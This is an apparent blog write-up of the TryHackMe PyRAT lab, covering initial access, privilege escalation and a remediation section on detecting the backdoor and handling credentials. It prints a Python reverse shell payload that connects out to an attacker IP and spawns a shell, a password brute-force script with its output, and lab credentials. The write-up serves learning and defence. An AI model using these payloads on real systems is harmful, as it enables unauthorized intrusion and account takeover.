---
title: THM PyRAT - Exploitation and Remediation
categories:
  - offensive-security
tags:
  - tryhackme
  - exploitation
  - remediation
---


# PyRAT — Exploitation and Remediation

This post walks through the exploitation of the TryHackMe's *PyRAT* machine, covering both initial access and privilege escalation, with a deliberate focus on remediation. Exploitation without remediation is incomplete—understanding how to fix a weakness is just as important as knowing how to abuse it. While it is not lost on me that this is an easy THM machine designed to be vulnerable, remediation should always be considered and is a great way to learn more.

Enumeration steps and alternative attack paths are intentionally omitted to keep the focus on exploitation mechanics and defensive takeaways.
## Initial Access

An initial `nmap` scan reveals ports **22 (SSH)** and **8000 (TCP)** exposed. Browsing to the HTTP service on port 8000 returns a message suggesting the use of a more basic connection method. Connecting with `netcat` confirms that the service accepts raw input over TCP.

```bash

nc <target-ip> 8000

```

The service drops the user into an interactive prompt that evaluates basic Python syntax. This effectively provides code execution within a constrained Python environment.
  
```bash
root@kali:~# nc 10.64.147.169 8000
print("Hello!")
Hello!!
```

To transition from limited execution to a stable shell, a Python reverse shell payload was generated using **revshells.com** and executed within the service:

```python

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.xxx.xxx",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("/bin/sh")
```

This payload establishes a reverse shell, providing interactive access to the system. This is a one-liner. I segmented it for readability.

## Privilege Escalation

Privilege escalation occurs in two distinct phases.

### Phase 1: Credential Exposure

During local enumeration, sensitive credentials are discovered in a Git configuration file located at:
  
`/opt/dev/.git/config`

The presence of credentials allow direct SSH access to the system as a legitimate user, think
  
```bash
$ cat /opt/dev/.git/config
[core]
    repositoryformatversion = 0
    filemode = true
    bare = false
    logallrefupdates = true

[user]
    name = Jose Mario
    email = josemlwdf@github.com

[credential]
    helper = cache --timeout=3600

[credential "https://github.com"]
    username = think
    password = THINKINGPirate$

```
  

---

  

### Phase 2: Root Access via PyRAT Backdoor

  

Further enumeration reveals a clue in the local mail file:

  `/var/mail/think`

```bash
think@ip-10-64-147-169:~$ cat /var/mail/think
From root@ip-10-64-147-169 Thu Jun 15 09:01:55 2023
Return-Path: <root@ip-10-64-147-169>
X-Original-To: think@pyrat
Delivered-To: think@pyrat
Received: by ip-10-64-147-169 (Postfix, from userid 0)
    id 2D2F62F1; Thu, 15 Jun 2023 09:01:55 +0000 (UTC)
Subject: Hello
To: think@pyrat
X-Mailer: Mailutils 3.7
Message-Id: <20230615090155.2D2F62F1@pyrat.localdomain>
Date: Thu, 15 Jun 2023 09:01:55 +0000 (UTC)
From: Dible Admin <root@pyrat>

Hello Jose, I wanted to tell you that I have installed the RAT you posted on your GitHub page, I'll test it tonight so don't be scared if you see it running. Regards, Dible Admin

```
  

The contents reference a process containing the string *“rat”*. Reviewing running services confirms the presence of a suspicious background process. Researching the service leads to the discovery of **PyRAT**, a malicious backdoor.
https://github.com/josemlwdf/PyRAT
  
```bash
think@ip-10-64-147-169:~$ ps -aux | grep -i rat
root       15  0.0  0.0      0     0 ?        00:19  0:00 [migration/0]
root       21  0.0  0.0      0     0 ?        00:19  0:00 [migration/1]
root      737  0.0  0.0   2616   536 ?        Ss   00:20  0:00 /bin/sh -c python3 /root/pyrat.py 2>/dev/null
root      748  0.0  0.6  177640 12460 ?       Sl   00:20  0:00 python3 /root/pyrat.py
www-data 1563  0.0  0.6  22128 12692 ?        S    00:27  0:00 python3 /root/pyrat.py
think    1725  0.0  0.0   6440   660 pts/1    S+   00:40  0:00 grep --color=auto -i rat

```


The PyRAT service listens on port 8000 and exposes an undocumented `admin` command. When issued, the service prompts for a password. Because no rate limiting or authentication controls are in place, the password can be brute-forced.

  

A simple Python script was used to brute-force the administrative password:

  

```python
import socket
import sys

port = 8000
passfile = sys.argv[1]

with open(passfile) as f:
    for password in f:
        s = socket.socket()
        s.connect(('<target-ip>', port))
        s.send(b'admin')
        s.recv(1024)
        s.send(password.encode())
        response = s.recv(1024).decode()
        print(f"[-] Trying {password.strip()} ..")
        if "Welcome" in response:
            print(f"[+] Password found: {password.strip()}")
            break
        s.close()
```

  
```bash
root@kali:~# python3 brute.py /usr/share/wordlists/rockyou.txt
[-] Trying 123456 ..
[-] Trying 12345 ..
[-] Trying 123456789 ..
[-] Trying password ..
[-] Trying iloveyou ..
[-] Trying princess ..
[-] Trying rockyou ..
[-] Trying 12345678 ..
[+] Password: abc123

```

```bash
root@kali:~# nc 10.64.147.169 8000
admin
Password:
abc123
Welcome Admin!!! Type "shell" to begin
shell
# whoami
root
```

Successful authentication grants root-level access to the system.

## Remediation

  

This machine highlights several common and high-impact security failures.

### Rootkit-Driven Initial Access and Privilege Escalation

In this environment, `pyrat.py` was responsible for both initial access and subsequent privilege escalation. While it behaves like a rootkit from an attacker’s perspective, PyRAT is technically a Python-based backdoor rather than a kernel-level rootkit that replaces system binaries.

Key takeaways from this scenario:

- `pyrat.py` enabled unauthenticated remote access and administrative control
- Traditional rootkit detection tools alone are insufficient
- Externally exposed services must be tightly restricted
- Continuous visibility through logging and SIEM monitoring is critical

Because PyRAT directly facilitated both access and escalation, it’s important to understand how a defender might identify it running on a system.

---

### Identifying PyRAT in a Live Environment

After cloning the PyRAT repository, I executed it on a test VM:

```bash
┌──(root㉿kali)-[/opt/PyRAT]
└─# python3 pyrat.py
Server listening on 0.0.0.0:8000...
```

At this point, the backdoor is actively listening on all interfaces. A quick way to enumerate active network services is:

```bash
ss -ntplu
```

This allows defenders to identify listening ports, associated processes, and privilege levels. From here, services can be cross-checked against what *should* be running in the environment.

---

### Why Rootkit Hunters Don’t Catch This

Although PyRAT behaves maliciously, it does not modify kernel modules or replace system binaries. As a result, tools such as `rkhunter` and `chkrootkit` are unlikely to flag it.

This highlights an important defensive lesson:

Not all high-impact compromises involve traditional rootkits.

Effective detection in this case relies on:

- Monitoring unexpected listening services
- Reviewing long-running Python processes
- Verifying service exposure (especially `0.0.0.0` bindings)
- Enforcing least privilege and service isolation
- Feeding process and network telemetry into a SIEM for alerting

Ultimately, visibility into what is running, where it is listening, and under which privileges is far more effective than relying solely on signature-based rootkit scanners.

### Credential Management Failures
- Never store secrets in version control.
- Use environment variables or secrets managers.
- Change exposed credentials immediately.

To make matters worse, there were credentials stored in clear-text that allowed a low-privilege user to trivially laterally move to another user. It is critical to NOT store credentials in cleartext. If you must store credentials on a system, utilize a strong password manager or encrypt databases manually. 